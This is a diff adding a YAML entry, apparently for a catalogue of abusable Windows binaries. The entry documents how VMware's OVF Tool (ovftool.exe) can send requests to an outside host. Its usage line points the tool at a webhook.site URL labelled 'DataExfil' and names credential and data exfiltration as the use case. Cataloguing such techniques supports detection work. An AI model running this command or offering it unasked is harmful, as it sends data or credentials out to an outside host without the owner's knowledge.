@@ -1,0 +1,18 @@
+---
+Name: VMware OVF Tool
+Description: VMware OVF Tool is a command-line utility that helps you import and export OVF packages to and from many VMware products. 
+Author: 'Ialle Teixeira'
+Created: 2023-07-14
+Usage:
+  - Steps: Just execute via command line  C:\Program Files (x86)\VMware\VMware Workstation\OVFTool> ovftool.exe https://webhook.site/{token}?DataExfil
+    Description: OVFTool.exe can be used to make a curl based request
+    Usecase: Upload file, credentials or data exfiltration in general
+    Category: Upload file
+    Privileges: User interaction/User
+    MitreID: TT1567
+Resources:
+  - Link: https://developer.vmware.com/web/tool/4.4.0/ovf
+  - Link: https://www.linkedin.com/feed/update/urn:li:activity:7085575162875539457/
+Acknowledgement:
+  - Person: Ialle Teixeira
+    Handle: 'in@isdebuggerpresent'
